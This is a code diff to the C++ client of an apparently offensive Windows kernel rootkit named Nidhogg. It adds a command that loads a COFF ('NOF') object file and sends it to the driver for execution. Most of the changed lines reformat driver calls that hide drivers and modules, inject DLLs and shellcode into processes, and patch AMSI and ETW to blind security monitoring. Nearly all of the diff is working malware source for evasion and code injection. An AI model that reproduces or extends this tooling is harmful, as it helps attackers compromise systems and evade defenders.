@@ -275,6 +275,50 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
 		}
 		std::cout << "ETW patched successfully in process " << pid << "." << std::endl;
 	}
+	else if (commandName.compare("load_nof") == 0) {
+		std::string parameter = "";
+
+		if (params.size() < 2 || params.size() > 3) {
+			PrintHelp();
+			return;
+		}
+
+		if (!IsValidPath(params.at(0)) || params.at(1).empty() || params.at(1).size() > MAX_PATH) {
+			PrintHelp();
+			return;
+		}
+
+		if (params.size() == 3) {
+			if (params.at(2).empty()) {
+				PrintHelp();
+				return;
+			}
+			parameter = params.at(2);
+		}
+
+		std::wstring nofPath = std::wstring(params.at(0).begin(), params.at(0).end());
+		std::ifstream inputFile(nofPath, std::ios::binary);
+
+		if (inputFile.bad()) {
+			std::wcerr << L"Invalid NOF file." << std::endl;
+			PrintHelp();
+			return;
+		}
+		std::vector<byte> data(std::istreambuf_iterator<char>(inputFile), {});
+		inputFile.close();
+
+		if (data.empty()) {
+			std::wcerr << L"NOF file is empty." << std::endl;
+			PrintHelp();
+			return;
+		}
+
+		if (!LoadNof(data, params.at(1), parameter)) {
+			std::wcerr << L"Failed to load NOF " << nofPath << L"." << std::endl;
+			return;
+		}
+		std::wcout << L"NOF " << nofPath << L" loaded successfully." << std::endl;
+	}
 	else {
 		std::cerr << "Invalid command!" << std::endl;
 		PrintHelp();
@@ -462,7 +506,15 @@ bool MemoryHandler::HideDriver(_In_ std::wstring driverPath, _In_ bool hide) {
 		return false;
 	driverInfo.DriverName = driverPath.data();
 	driverInfo.Hide = hide;
-	return DeviceIoControl(*hNidhogg.get(), IOCTL_HIDE_UNHIDE_DRIVER, &driverInfo, sizeof(driverInfo), nullptr, 0, &returned, nullptr);
+
+	return DeviceIoControl(*hNidhogg.get(), 
+		IOCTL_HIDE_UNHIDE_DRIVER, 
+		&driverInfo, 
+		sizeof(driverInfo), 
+		nullptr, 
+		0, 
+		&returned, 
+		nullptr);
 }
 
 /*
@@ -488,7 +540,15 @@ bool MemoryHandler::HideModule(_In_ DWORD pid, _In_ std::wstring modulePath, _In
 	moduleInfo.Pid = pid;
 	moduleInfo.ModuleName = modulePath.data();
 	moduleInfo.Hide = hide;
-	return DeviceIoControl(*hNidhogg.get(), IOCTL_HIDE_RESTORE_MODULE, &moduleInfo, sizeof(moduleInfo), nullptr, 0, &returned, nullptr);
+
+	return DeviceIoControl(*hNidhogg.get(), 
+		IOCTL_HIDE_RESTORE_MODULE, 
+		&moduleInfo, 
+		sizeof(moduleInfo), 
+		nullptr, 
+		0, 
+		&returned, 
+		nullptr);
 }
 
 /*
@@ -519,7 +579,15 @@ bool MemoryHandler::InjectDll(_In_ DWORD pid, _In_ std::string dllPath, _In_ Inj
 		return false;
 	}
 	DWORD returned = 0;
-	return DeviceIoControl(*hNidhogg.get(), IOCTL_INJECT_DLL, &dllInformation, sizeof(dllInformation), nullptr, 0, &returned, nullptr);
+
+	return DeviceIoControl(*hNidhogg.get(), 
+		IOCTL_INJECT_DLL, 
+		&dllInformation, 
+		sizeof(dllInformation), 
+		nullptr, 
+		0, 
+		&returned, 
+		nullptr);
 }
 
 /*
@@ -566,7 +634,15 @@ bool MemoryHandler::InjectShellcode(_In_ DWORD pid, _In_ std::vector<byte> shell
 			}
 		}
 	}
-	return DeviceIoControl(*hNidhogg.get(), IOCTL_INJECT_SHELLCODE, &shellcodeInfo, sizeof(shellcodeInfo), nullptr, 0, &returned, nullptr);
+
+	return DeviceIoControl(*hNidhogg.get(), 
+		IOCTL_INJECT_SHELLCODE, 
+		&shellcodeInfo, 
+		sizeof(shellcodeInfo), 
+		nullptr, 
+		0, 
+		&returned, 
+		nullptr);
 }
 
 /*
@@ -594,7 +670,15 @@ bool MemoryHandler::PatchModule(_In_ DWORD pid, _In_ std::wstring moduleName, _I
 	patchedModule.ModuleName = moduleName.data();
 	patchedModule.FunctionName = functionName.data();
 	patchedModule.Patch = patch.data();
-	return DeviceIoControl(*hNidhogg.get(), IOCTL_PATCH_MODULE, &patchedModule, sizeof(patchedModule), nullptr, 0, &returned, nullptr);
+
+	return DeviceIoControl(*hNidhogg.get(), 
+		IOCTL_PATCH_MODULE, 
+		&patchedModule, 
+		sizeof(patchedModule), 
+		nullptr, 
+		0, 
+		&returned, 
+		nullptr);
 }
 
 /*
@@ -623,4 +707,50 @@ bool MemoryHandler::PatchAmsi(_In_ DWORD pid) {
  */
 bool MemoryHandler::PatchEtw(_In_ DWORD pid) {
 	return PatchModule(pid, NTDLL_PATH, "EtwEventWrite", ETW_BYPASS_PAYLOAD);
+}
+
+/*
+ * Description:
+ * LoadNof is responsible for loading a NOF.
+ *
+ * Parameters:
+ * @data		   [_In_ std::vector<byte>] -- The NOF data.
+ * @entryPointName [_In_ std::string]		-- The name of the entry point function.
+ * @parameter	   [_In_ std::string]		-- The parameter for the NOF (optional).
+ *
+ * Returns:
+ * @bool									-- Whether the loading was successful or not.
+ */
+bool MemoryHandler::LoadNof(_In_ std::vector<byte> data, 
+	_In_ std::string entryPointName, 
+	_In_opt_ std::string parameter) {
+	DWORD returned = 0;
+	IoctlCoff coffInfo{};
+
+	if (data.empty() || entryPointName.empty() || entryPointName.size() > MAX_PATH) {
+		std::cerr << "Invalid NOF data or entry point name." << std::endl;
+		return false;
+	}
+	coffInfo.Data = data.data();
+	coffInfo.DataSize = data.size();
+	errno_t err = strcpy_s(coffInfo.EntryName, entryPointName.c_str());
+
+	if (err != 0) {
+		std::cerr << "Failed to copy entry point name." << std::endl;
+		return false;
+	}
+
+	if (parameter.size() > 0) {
+		coffInfo.Parameter = const_cast<char*>(parameter.data());
+		coffInfo.ParameterSize = parameter.size();
+	}
+	
+	return DeviceIoControl(*hNidhogg.get(), 
+		IOCTL_EXEC_NOF, 
+		&coffInfo, 
+		sizeof(coffInfo), 
+		nullptr, 
+		0, 
+		&returned,
+		nullptr);
 }
